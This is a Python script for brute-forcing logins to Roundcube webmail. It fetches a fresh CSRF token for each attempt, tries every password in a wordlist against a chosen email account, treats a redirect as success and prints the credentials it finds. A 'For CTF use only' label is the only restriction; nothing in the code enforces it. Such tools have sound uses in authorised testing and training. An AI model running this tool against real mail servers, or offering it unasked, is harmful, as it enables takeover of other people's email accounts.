#!/usr/bin/env python3
"""
Roundcube Login Brute-Forcer (CSRF-aware)
For CTF use only.
"""

import requests
import sys
import os
import argparse
from urllib.parse import urljoin

def parse_args():
    parser = argparse.ArgumentParser(
        description="Roundcube brute-forcer that handles CSRF tokens per request."
    )
    parser.add_argument("-u", "--url", required=True,
                        help="Base URL of Roundcube (e.g. http://target/roundcube/)")
    parser.add_argument("-U", "--username", required=True,
                        help="Username (email) to brute-force")
    parser.add_argument("-w", "--wordlist", required=True,
                        help="Path to password wordlist file")
    parser.add_argument("-t", "--timeout", type=int, default=15,
                        help="Request timeout in seconds (default: 15)")
    parser.add_argument("--stop-on-success", action="store_true", default=True,
                        help="Stop at first valid password (default: True)")
    return parser.parse_args()

def load_wordlist(path):
    if not os.path.isfile(path):
        sys.exit(f"[!] Wordlist not found: {path}")
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def get_token(session, login_url, timeout):
    """Fetch a fresh _token from the Roundcube login page."""
    r = session.get(login_url, timeout=timeout)
    r.raise_for_status()
    marker = 'name="_token" value="'
    if marker not in r.text:
        # Some versions use single quotes or different attribute order
        marker = "name='_token' value='"
    if marker not in r.text:
        raise ValueError("Could not locate _token in login page HTML.")
    token = r.text.split(marker, 1)[1].split('"', 1)[0].split("'", 1)[0]
    return token

def try_login(base_url, username, password, timeout):
    login_url = urljoin(base_url, "?_task=login")
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (CTF)"
    })

    try:
        token = get_token(session, login_url, timeout)

        data = {
            "_token": token,
            "_task": "login",
            "_action": "login",
            "_timezone": "",
            "_url": "",
            "_user": username,
            "_pass": password,
        }

        resp = session.post(
            login_url,
            data=data,
            allow_redirects=False,
            timeout=timeout,
        )

        # Success: Roundcube typically redirects (302/303) on valid login
        if resp.status_code in (301, 302, 303):
            return True, resp
        return False, resp

    except requests.RequestException as e:
        return None, str(e)
    except ValueError as e:
        return None, str(e)

def main():
    args = parse_args()

    # Normalize base URL (ensure trailing slash)
    base_url = args.url if args.url.endswith("/") else args.url + "/"

    passwords = load_wordlist(args.wordlist)
    total = len(passwords)
    print(f"[*] Target   : {base_url}")
    print(f"[*] Username : {args.username}")
    print(f"[*] Wordlist : {args.wordlist} ({total} passwords)")
    print(f"[*] Timeout  : {args.timeout}s\n")

    found = None
    for i, pwd in enumerate(passwords, 1):
        ok, resp = try_login(base_url, args.username, pwd, args.timeout)

        if ok is None:
            print(f"[{i}/{total}] [!] Error for '{pwd}': {resp}")
            continue

        if ok:
            print(f"[{i}/{total}] [+] SUCCESS: {args.username}:{pwd}")
            found = pwd
            if args.stop_on_success:
                break
        else:
            print(f"[{i}/{total}] [-] {pwd}  (HTTP {resp.status_code})")

    print()
    if found:
        print(f"[✓] Credentials found -> {args.username}:{found}")
    else:
        print("[x] No valid password found in wordlist.")

if __name__ == "__main__":
    main()
